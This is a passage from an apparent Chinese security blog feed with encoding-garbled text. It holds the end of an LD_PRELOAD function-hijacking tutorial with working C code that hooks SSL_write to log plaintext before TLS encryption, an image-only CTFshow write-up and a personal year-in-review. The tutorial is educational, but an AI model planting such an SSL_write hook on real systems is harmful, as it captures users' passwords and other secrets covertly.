class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">puts</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *message)</span> </span>&#123;<span class="comment">/*è¿™é‡Œåº”ä¸åŸå‡½æ•°ä¿æŒä¸€è‡´ï¼*/</span></span><br><span class="line">  <span class="keyword">int</span> (*new_puts)(<span class="keyword">const</span> <span class="keyword">char</span> *message);<span class="comment">/*å®šä¹‰ä¸€ä¸ªæŒ‡é’ˆå˜é‡*/</span></span><br><span class="line">  new_puts = dlsym(RTLD_NEXT, <span class="string">&quot;puts&quot;</span>);<span class="comment">/*æŒ‡é’ˆå˜é‡å­˜å‚¨åŸputså‡½æ•°çš„åœ°å€*/</span></span><br><span class="line">  <span class="keyword">return</span> new_puts(<span class="string">&quot;zhe bo hen nice!&quot;</span>);<span class="comment">/*æ›¿æ¢å…¶ä¼ å…¥çš„å‚æ•°å­—ç¬¦ä¸²ï¼Œä»è€Œå¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>dlsymå‡½æ•°ä½œç”¨æ˜¯åˆå§‹åŒ–å‡½æ•°æŒ‡é’ˆï¼Œä¼ å…¥æ­¤å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°RTLD_NEXTå‘Šè¯‰åŠ¨æ€åŠ è½½ç¨‹åºAPIï¼Œè¿”å›ç¬¬äºŒä¸ªå‚æ•°å­—ç¬¦ä¸²çš„ä¸€ä¸ªå®ä¾‹ï¼Œæœ¬ä¾‹å°±æ˜¯puts åŸå‡½æ•°ã€‚</p><p>ç„¶åç¼–è¯‘æˆåº“æ–‡ä»¶ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc libc_puts.c -fPIC -shared -ldl -D_GNU_SOURCE -o libc_puts</span><br></pre></td></tr></table></figure><p>å‚æ•°è¯¦è§£ï¼š</p><p>æˆ‘ä»¬é€šè¿‡æŒ‡å®š-sharedå’Œ-fPICç¼–è¯‘æ ‡å¿—å°†libc_puts.cç¼–è¯‘ä¸ºå…±äº«åº“ï¼Œå¹¶ä½¿ç”¨-ldlæ ‡å¿—é’ˆå¯¹libdlè¿›è¡Œé“¾æ¥,æŒ‡å®š-D_GNU_SOURCEæ ‡å¿—ä»¥æ»¡è¶³#ifdefæ¡ä»¶ï¼Œè¯¥æ¡ä»¶å…è®¸æˆ‘ä»¬ä½¿ç”¨RTLD_NEXTæšä¸¾,é€šè¿‡æšä¸¾æˆ‘ä»¬æ‰èƒ½æ‰¾åˆ°åŸå‡½æ•°puts,å½“ç„¶ä¹Ÿå¯ä»¥é€šè¿‡åœ¨libc_puts.cæ–‡ä»¶é¡¶éƒ¨æ·»åŠ â€œ #define _GNU_SOURCEâ€æ¥æ›¿æ¢æ­¤æ ‡å¿—ã€‚</p><p>è¿™æ—¶å€™æˆ‘ä»¬ä½¿ç”¨exportå‘½ä»¤å°†LD_PRELOADç¯å¢ƒå˜é‡æŒ‡å‘æ–°åˆ›å»ºçš„libc_putså…±äº«åº“ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export LD_PRELOAD&#x3D;&quot;&#x2F;home&#x2F;hacker&#x2F;test&#x2F;libc_puts.so&quot;</span><br></pre></td></tr></table></figure><p>ç„¶åè¿è¡Œtestæ–‡ä»¶ï¼Œæˆ‘ä»¬å°†æ‰“å°çš„å†…å®¹ç»™æ›¿æ¢äº†</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1271906983.png"></p><p>LD_PRELOADç¯å¢ƒå˜é‡ç”¨äºæŒ‡å®šè¦ç”±åŠ è½½ç¨‹åºé¦–å…ˆåŠ è½½çš„å…±äº«åº“ï¼Œé¦–å…ˆåŠ è½½å…±äº«åº“ä½¿æˆ‘ä»¬èƒ½å¤Ÿæ‹¦æˆªå‡½æ•°è°ƒç”¨ï¼Œå¹¶ä¸”ä½¿ç”¨åŠ¨æ€åŠ è½½ç¨‹åºAPIï¼Œæˆ‘ä»¬å¯ä»¥å°†æœ€åˆæƒ³è¦çš„putså‡½æ•°ç»‘å®šåˆ°å‡½æ•°æŒ‡é’ˆï¼Œå¹¶é€šè¿‡å®ƒä¼ é€’æˆ‘ä»¬èƒ½æ§åˆ¶çš„å‚æ•°ï¼Œä»è€Œæœ‰æ•ˆåœ°åŠ«æŒå‡½æ•°è°ƒç”¨ã€‚</p><blockquote><p>æˆ‘ä»¬å·²ç»ç†Ÿæ‚‰äº†ç¨‹åºåŠ è½½æ—¶çš„å‡½æ•°åŠ«æŒæŠ€æœ¯ï¼Œæ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†ç”¨äºå®é™…æ“ä½œ</p></blockquote><p>æ¥ä¸‹æ¥æˆ‘ä»¬å°†å‡è®¾ä¸€ä¸ªå®é™…çš„åº”ç”¨åœºæ™¯ï¼Œæˆ‘ä»¬æ‹¿åˆ°äº†ä¸€ä¸ªåº”ç”¨ç¨‹åºè¿›è¡Œæ¸—é€æµ‹è¯•ï¼Œè¯¥åº”ç”¨ç¨‹åºä½¿ç”¨çš„æ˜¯opensslåŠ å¯†æ•æ„Ÿæ•°æ®çš„ä¼ è¾“ï¼Œå—…æ¢æµé‡åŒ…ï¼Œåœ¨æ²¡æœ‰è·å¾—ç§é’¥çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬æ— æ³•æ‹¿åˆ°æˆ‘ä»¬æƒ³è¦çš„æ•æ„Ÿä¿¡æ¯ï¼Œè¿™æ—¶å€™æˆ‘ä»¬è¯¥æ€ä¹ˆåŠï¼Ÿ</p><p>ä¸ºäº†è·å¾—æ•æ„Ÿæ•°æ®ï¼Œæˆ‘ä»¬å°†åŠ«æŒSSL_writeå‡½æ•°çš„è°ƒç”¨ï¼Œè¯¥å‡½æ•°è´Ÿè´£åŠ å¯†ç„¶åé€šè¿‡å¥—æ¥å­—å‘é€æ•°æ®ã€‚åŠ«æŒè¯¥å‡½æ•°ï¼Œæˆ‘ä»¬å°†ç»•è¿‡åŠ å¯†ä¿æŠ¤ï¼Œè·å¾—åŸå§‹çš„è¦è¢«åŠ å¯†çš„ä¼ è¾“çš„å­—ç¬¦ä¸²ï¼Œé¦–å…ˆæˆ‘ä»¬æ¥çœ‹çœ‹SSL_writeå‡½æ•°çš„å®šä¹‰ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int SSL_write ï¼ˆSSL * sslï¼Œconst void * bufï¼Œint num ï¼‰;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬åˆ›å»ºlibc_ssl_write.cæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl/ssl.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">SSL_write</span><span class="params">(SSL *context, <span class="keyword">const</span> <span class="keyword">void</span> *buffer, <span class="keyword">int</span> bytes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> (*new_ssl_write)(SSL *context, <span class="keyword">const</span> <span class="keyword">void</span> *buffer, <span class="keyword">int</span> bytes);</span><br><span class="line">  new_ssl_write = dlsym(RTLD_NEXT, <span class="string">&quot;SSL_write&quot;</span>);</span><br><span class="line">  FILE *logfile = fopen(<span class="string">&quot;logfile&quot;</span>, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(logfile, <span class="string">&quot;Process %d:nn%snnn&quot;</span>, getpid(), (<span class="keyword">char</span> *)buffer);<span class="comment">/*è¿™é‡Œå¢åŠ äº†è·å¾—è¿›ç¨‹å·çš„ä¸€é¡¹åŠŸèƒ½ï¼Œè¿™ä¼šæ•°æ®æ¥è·¯æ›´åŠ æ¸…æ™°ï¼ï¼Œä¾¿äºæˆ‘ä»¬æŸ¥çœ‹*/</span></span><br><span class="line">  fclose(logfile);<span class="comment">/*æŠŠåŸå§‹è¦è¢«åŠ å¯†çš„å­—ç¬¦ä¸²å†™å…¥ä¸€ä¸ªæ–‡ä»¶logfile*/</span></span><br><span class="line">  <span class="keyword">return</span> new_ssl_write(context, buffer, bytes);<span class="comment">/*è¿˜æ˜¯è¿”å›åŠ å¯†å¾—å­—ç¬¦ä¸²ï¼Œç¡®ä¿ä¸ç ´åç¨‹åºçš„æ­£å¸¸åŠŸèƒ½*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SSL_writeå‡½æ•°éœ€è¦ä¸‰ä¸ªå‚æ•°ï¼šæŒ‡å‘sslä¸Šä¸‹æ–‡çš„æŒ‡é’ˆï¼ŒæŒ‡å‘è¦åŠ å¯†çš„å­—ç¬¦ä¸²ç¼“å†²åŒºæŒ‡é’ˆï¼Œä»¥åŠè¦å†™å…¥çš„å­—èŠ‚æ•°ã€‚</p><p>ç„¶åç¼–è¯‘ï¼šï¼ˆæ³¨æ„ï¼Œå¦‚æœæ²¡æœ‰openssl/ssl.håº“ä¼šæŠ¥é”™ï¼Œaptä¸‹è½½å°±è¡Œäº†ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc libc_ssl_write.c -o libc_ssl_write -fPIC -shared -lssl -D_GNU_SOURCE</span><br></pre></td></tr></table></figure><p>ç”¨exportå‘½ä»¤å°†LD_PRELOADç¯å¢ƒå˜é‡æŒ‡å‘æ–°åˆ›å»ºçš„libc_ssl_writeå…±äº«åº“</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/656147971.png"></p><p>è¿™é‡Œæˆ‘ç”¨wgetå·¥å…·å»ä¸‹è½½ç™¾åº¦çš„ä¸»é¡µï¼Œæ­£å¸¸æ¥è¯´è¯·æ±‚çš„æ•°æ®åŒ…ä¼šè¢«åŠ å¯†ï¼Œä½†æ˜¯æˆ‘ä»¬ç›´æ¥åœ¨åŠ å¯†ä¹‹å‰æŠŠä¼ å…¥çš„æ•°æ®åŒ…å†…å®¹å†™å…¥äº†logfileæ–‡ä»¶é‡Œï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥è·å¾—æ•æ„Ÿæ•°æ®äº†ã€‚</p><p>å¦‚æœä¸€ä¸ªé»‘å®¢æ½œå…¥åˆ°ä¸€å°ä¸»æœºé‡Œï¼Œç„¶åå·å·æ›¿æ¢äº†å…±äº«åº“ï¼ŒåŠ«æŒäº†ssl_writeå‡½æ•°ï¼Œå°†ä½ æ‰€ä»¥éœ€è¦ç»è¿‡sslåŠ å¯†ä¼ è¾“çš„æ•°æ®å†™å…¥ä¸€ä¸ªæ–‡ä»¶ï¼Œå‡å¦‚ä½ ç™»å…¥è¾“å…¥ä½ çš„é“¶è¡Œå¡è´¦æˆ·ç§˜å¯†ä»€ä¹ˆçš„ï¼Œé»‘å®¢æ ¹æœ¬ä¸éœ€è¦æ—¶åˆ»ç›‘è§†è¿™å°ä¸»æœºï¼Œåªéœ€è¦å®šæœŸæ¥æŸ¥çœ‹logfileæ–‡ä»¶å†…å®¹å°±å¯ä»¥äº†ã€‚</p><p>å½“ç„¶è¿™æ˜¯ä¸€ç§åˆ©ç”¨æ–¹å¼ï¼Œå› ä¸ºæˆ‘ä»¬åˆ›å»ºçš„å…±äº«åº“å°†è¢«åŠ è½½åˆ°æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹çš„å†…å­˜ç©ºé—´ä¸­ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æ‰§è¡Œè¯¸å¦‚è½¬å‚¨è¿›ç¨‹çš„å†…å­˜ä»¥åœ¨è¿è¡Œæ—¶æ£€æŸ¥å†…å­˜æˆ–ç¯¡æ”¹è¿è¡Œæ—¶å˜é‡ä¹‹ç±»çš„äº‹æƒ…ï¼Œè¿™å°†å˜å¾—æ›´åŠ å±é™©ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Gammaå®éªŒå®¤ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å…±äº«å¯¹è±¡æ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow-webå…¥é—¨-ä¿¡æ¯æœé›†</title>
      <link href="2020/11/01/ctfshow-web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
      <url>2020/11/01/ctfshow-web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å‚è€ƒèµ„æ–™ï¼š<a href="https://blog.csdn.net/a597934448/article/details/105431367">https://blog.csdn.net/a597934448/article/details/105431367</a></p></blockquote><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1065173282.png"></p><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3267216684.png"></p><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3867703243.png"></p><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4214956640.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/235136532.png"></p><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4073553634.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/176519077.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2894530419.png"></p><h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1898524929.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2828602541.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3253027381.png"></p><h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/3732467584.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1235846651.png"></p><h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2040094773.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3089578362.png"></p><h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/500588266.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/441315421.png"></p><h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2994603857.png"></p><h2 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3875009964.png"></p><h2 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3576419469.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2499309695.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1528627799.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1528627799%20(1).png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3816970691.png"></p><h2 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1883578652.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/67120606.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4012715523.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1345272445.png"></p><h2 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3536465236.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3978869054.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1131000910.png"></p><h2 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3627398352.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1277343370.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3321910425.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2612947482.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2905094112.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3222540757.png"></p><h2 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1833872717.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1124225678.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4036923169.png"></p><h2 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3194245228.png"></p><h2 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/590871930.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3579305911.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2720214617.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1020918645.png"></p><h2 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2291258854.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3917635989.png"></p><h2 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2089687022.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2073303903.png"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å†è§2020ï¼Œä½ å¥½2021ï¼</title>
      <link href="2020/10/28/%E5%86%8D%E8%A7%812020%EF%BC%8C%E4%BD%A0%E5%A5%BD2021/"/>
      <url>2020/10/28/%E5%86%8D%E8%A7%812020%EF%BC%8C%E4%BD%A0%E5%A5%BD2021/</url>
      
        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>åŸæœ¬èº«ä¸º<strong>æ‡’ç‹—</strong>çš„æˆ‘æ˜¯ä¸å‡†å¤‡å†™è¿™<strong>å¹´åº¦æ€»ç»“</strong>æ»´QAQ</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3896961981.png"></p><p><strong>but</strong> è·¨å¹´å¤œå¤–é¢å°±å’Œ<strong>æ‰“æˆ˜</strong>ä¸€æ ·ä¸€ç‚®æ¥ä¸€ç‚®ï¼ˆåµæ­»ä¸ªäººï¼‰ï¼Œæœ€ç»ˆçˆ¬èµ·æ¥ç®€å•å†™ä¸€ä¸‹æ€»ç»“</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2789148925.png"></p><h1 id="2020"><a href="#2020" class="headerlink" title="2020"></a>2020</h1><p>2020å¹´åˆç”±äºç–«æƒ…ä¸ç”¨å»å­¦æ ¡ä½¿å¾—æˆ‘æœ‰å¤§æŠŠæ—¶é—´æµªï¼Œè€èµ›æ£çš„æˆ‘å‚åŠ äº†è®¸å¤šåœºæ¯”èµ›ï¼ˆç­¾åˆ°é€‰æ‰‹~ï¼‰ä¹Ÿæ­£æ˜¯å› æ­¤è®¤è¯†è®¸å¤šå¿—ç¾¤é“å’Œçš„å¸ˆå‚…ä»¬ï¼ŒæœŸé—´æ³»è¯0kamié‚€è¯·åŠ å…¥äº†N1ceä¸€èµ·æ‰“æ¯”èµ›ï¼Œæ„Ÿè°¢å„ä½é™ªä¼´æˆ‘ä¸€èµ·èµ°è¿‡äº†é‚£æ®µå¯èƒ½è®©æˆ‘å¾ˆæ— èŠçš„æ—¶å…‰ï¼</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/281048712.png"></p><p>æ¥ç€å°±åˆ°äº†ä¸€å¹´ä¸¤åº¦çš„æœŸæœ«è€ƒäº†ï¼Œæ„Ÿè°¢çº¿ä¸Šè€ƒè¯•è®©æˆ‘è½»æ¾åŠæ ¼ä»¥åŠç”µè·¯åˆ†æè¡¥è€ƒé¡ºåˆ©è¿‡å…³~niceï¼å¯¹äº†ï¼Œè€ƒå‰å‚åŠ çš„DozerCTFè¿˜æ‹¿äº†ä¸ªä¼˜(å®‰)ç§€(æ…°)å¥–</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1131924316.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2759603271.png"></p><p>æ¥ç€å°±æ˜¯ä¸€æ³¢å®‰é€¸çš„æš‘å‡</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1066182434.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3957289886.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2896770062.png"></p><p>è¿˜æœ‰å¥½å¤šå°±ä¸ä¸€ä¸€åˆ—å‡ºäº†~</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/907688659.png"></p><p>å¾ˆå¿«å°±é€šçŸ¥å¼€å­¦äº†ï¼Œå¾—å»å­¦æ ¡äº†ï¼ˆæœ‰ä¸€è¯´ä¸€æˆ‘æ˜¯çœŸä¸æƒ³å»å­¦æ ¡QAQï¼‰å¥½æ—¥å­å°±è¿™æ ·æ²¡äº†<br>ä¸€åˆ°å­¦æ ¡å°±å„ç§å¥‡å¥‡æ€ªæ€ªçš„è§„çŸ©ï¼ˆçªç„¶æƒ³é˜´é˜³æ€ªæ°”~ä¸è¿‡æ¸£æ¸£äºŒæœ¬ä¹Ÿå°±è¿™æ ·äº†ï¼Œè®¤å‘½å§</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/276839316.png"></p><p><strong>å¤§è¿‡å¹´çš„è¿˜æ˜¯æ•´å–œåº†ç‚¹â‘§</strong><br>âˆš<br>å¼€å­¦åæˆ‘å°±å¤§äºŒå•¦ï¼Œå–œæå­¦é•¿ç§°å·</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3885537572.png"></p><p>ç”±äºæˆ‘ä»¬å­¦æ ¡æ–­å±‚äº†ï¼Œå¼€å­¦åæˆ‘æ¥æ‰‹äº†ç½‘ç»œå®‰å…¨åä¼šçš„ä¼šé•¿ä¸€èŒï¼ˆæœ¬äººå…¶å®å¹¶ä¸æ˜¯å¾ˆæƒ³å½“<br>æ¥ç€å°±æ˜¯ä¸€å¹´ä¸€åº¦çš„ç½‘ç»œå®‰å…¨å®£ä¼ å‘¨ï¼Œå„åœ°çœèµ›æ¥è¸µè€Œè‡³ï¼Œæˆ‘ä»¬å¤§ç¦å»ºå½“ç„¶ä¹Ÿä¸åˆ—å¤–ï¼Œä¸è¿‡ç”±äºç–«æƒ…ï¼Œç™¾è¶Šæ¯è¢«å†²æ‰ï¼Œé»‘ç›¾æ¯å˜æˆçº¿ä¸Šèµ›ï¼Œä¸è¿‡å·¥æ§è¿›å…¥å†³èµ›ä½¿å¾—æˆ‘æœ‰å¹¸å»äº†äººç”Ÿç¬¬ä¸€æ¬¡çº¿ä¸‹èµ›ï¼ˆäº”æ˜Ÿçº§é…’åº—æ—…æ¸¸â‰¥ â‰¤ï¼‰è¿™ä¹Ÿæ˜¯DJæœ€åä¸€æ¬¡å¸¦æˆ‘æ‰“æ¯”èµ›äº†~</p><p>æˆ‘ä»¬ä½çš„äº”æ˜Ÿçº§å¤§é…’åº—</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4038622941.png"></p><p>æ¯”èµ›ç°åœº</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2637872104.png"></p><p>å½“ç„¶è¿˜æœ‰å°å§å§ï¼ˆæ‰‹åŠ¨æ»‘ç¨½</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3331148832.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/186521305.png"></p><p>è’™è’™ç»†é›¨ä¸‹ç­‰é¢†å¯¼æ¥æ‹çš„å¤§åˆç…§ï¼ŒçŒœçŒœæˆ‘åœ¨å“ªå‘€ &gt;&lt;</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1078722651.png"></p><p>åŒæ—¶å’Œæˆ‘çš„å¥½å…„å¼ŸSDDä¸€èµ·ç»è¥äº†ä¸€ä¸ªå…¬ä¼—å·å–åè¿™æ³¢å¾ˆhackerå¹¶ä¸”å¾ˆæˆåŠŸï¼Œä¸‰ä¸ªæœˆï¼ˆ9-12ï¼‰ç²‰ä¸é‡ç ´äº”åƒï¼Œæˆ‘ä½œä¸ºå›¢é˜Ÿä¸­çš„ä¸€å‘˜æ·±æ„Ÿè£å¹¸ï¼12æœˆæˆ‘ä»¬æ›´åGammaå®éªŒå®¤ï¼Œå›¢é˜Ÿè¶Šåšè¶Šå¤§ï¼Œè¶Šåšè¶Šå¼ºï¼å¾ˆé«˜å…´è¿™ä¸€è·¯ä¸Šæœ‰ä½ ä»¬é™ªä¼´ï¼</p><p>å¯¹äº†ï¼Œ2020çš„æ–°ç”Ÿæ¯”æˆ‘ä»¬æ•´æ•´æ™šå¼€å­¦ä¸€ä¸ªå¤šæœˆâ€¦ç„¶åæˆ‘ä»¬åä¼šé¦–æ¬¡äº®ç›¸å­¦æ ¡ç¤¾å›¢å˜‰å¹´åï¼ˆç…§ç‰‡ä¸è§äº†~ï¼‰æˆåŠŸå®Œæˆçº³æ–°å·¥ä½œã€‚ï¼ˆbieï¼šä¸‹æ¬¡æŠŠå›¾ä¹¦é¦†å±å¹•æ—¥äº†å°±æ˜¾ç¤ºæˆ‘ä»¬ç½‘ç»œå®‰å…¨åä¼šï¼Œå†æŠŠèˆå°éŸ³å“æè¿›å»â€¦ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/160894819.png"></p><p>ä¹‹åå‡†å¤‡ä¸¾åŠæ ¡èµ›ï¼Œå¹¶ä¸”æˆåŠŸæ‹‰åˆ°äºæ™¨å›½é™…ITèµåŠ©æˆ‘ä»¬æœ¬æ¬¡æ¯”èµ›ï¼Œè¿˜ç®—ä¸é”™~</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/620707834.png"></p><p>å°±è¿™æ ·æ‘¸é±¼äº†ä¸€å­¦æœŸï¼Œå› 